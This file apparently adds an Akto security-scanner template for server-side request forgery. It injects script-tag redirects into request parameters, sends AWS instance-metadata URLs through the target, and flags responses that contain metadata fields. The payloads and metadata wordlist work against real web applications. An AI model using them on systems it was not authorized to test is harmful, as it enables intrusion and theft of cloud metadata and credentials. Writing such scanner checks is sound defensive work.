@@ -1,0 +1,105 @@
+id: SSRF_SCRIPT_TAG_AWS_REDIRECT
+info:
+  name: "SSRF test via replacing parameters with script tags containing redirect URLs for AWS internal URL"
+  description: "This tests involves the replacement of 
+  parameters with script tags containing internal AWS URLs with redirection aiming to assess the vulnerability 
+  of web applications to unauthorized server-side requests. By injecting these script 
+  tags, testers evaluate whether the application can be manipulated to make 
+  requests to internal resources, potentially leading to data 
+  breaches or system compromise. This technique helps identify and mitigate security 
+  flaws that could be exploited by attackers to gain unauthorized access or manipulate 
+  sensitive information."
+  details: "In this test, attackers replace parameters in web requests with script tags 
+  containing AWS URLs with redirection pointing to malicious destinations. These malicious URLs are 
+  designed to trigger server-side actions, potentially exploiting vulnerabilities 
+  in the target application. By analyzing the application's response to these 
+  manipulated requests, security testers assess its susceptibility to unauthorized 
+  data access, internal network probing, or even remote code execution. This method 
+  helps uncover and remediate SSRF vulnerabilities, safeguarding against potential 
+  exploitation by malicious actors."
+  impact: "The impact of SSRF vulnerabilities exploited via AWS URL 
+  injections with redirection can be severe. Attackers could gain unauthorized access to 
+  sensitive internal systems, databases, or cloud resources, leading to 
+  data theft, manipulation, or even complete system compromise. Furthermore, 
+  SSRF attacks may facilitate lateral movement within a network, enabling 
+  attackers to pivot and escalate privileges, amplifying the scope and severity 
+  of the breach. Without proper mitigation, these exploits pose significant 
+  risks to data integrity, confidentiality, and overall system security."
+  category:
+    name: SSRF
+    shortName: Server Side Request Forgery
+    displayName: Server Side Request Forgery (SSRF)
+  subCategory: SSRF_SCRIPT_TAG_AWS_REDIRECT
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://github.com/OWASP/API-Security/blob/master/2023/en/src/0xa6-server-side-request-forgery.md"
+    - "https://www.akto.io/blog/how-to-prevent-server-side-request-forgery-ssrf-as-a-developer"
+  cwe:
+    - CWE-918
+  cve:
+    - CVE-2022-4725
+api_selection_filters:
+  response_code:
+    and:
+      gte: 200
+      lt: 205
+  or:
+    - request_payload:
+        for_one:
+          key:
+            regex: .*
+            extract: param_key
+          value:
+            datatype: string
+    - query_param:
+        for_one:
+          key:
+            regex: .*
+            extract: param_key
+          value:
+            datatype: string
+wordLists:
+  redirect_urls:
+    - http://169.254.169.254/latest/meta-data/
+    - http://[fd00:ec2::254]/latest/meta-data/
+    - http://169.254.169.254/latest/meta-data/local-ipv4
+execute:
+  type: single
+  requests:
+    - req:
+        - send_ssrf_req:
+            url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+            redirect_url: ${redirect_urls}
+        - follow_redirect: true
+        - modify_query_param:
+            param_key: "<script> window.location=\"https://test-services.akto.io/store_uuid/${random_uuid}\";</script>"
+        - modify_body_param:
+            param_key: "<script> window.location=\"https://test-services.akto.io/store_uuid/${random_uuid}\";</script>"
+
+validate:
+  response_code:
+    gte: 200
+    lt: 300
+  ssrf_url_hit: ${random_uuid}
+  response_payload:
+    contains_either:
+      - "ami-id"
+      - "ami-launch-index"
+      - "ami-manifest-path"
+      - "block-device-mapping"
+      - "instance-action"
+    not_contains_either:
+      - Access Denied
+      - Error
+      - SSRF
+      - Blocked
+      - WAF
+      - Rejected
+      - Security Exception
+      - Invalid Request
+      - Connection Refused
+      - Failed
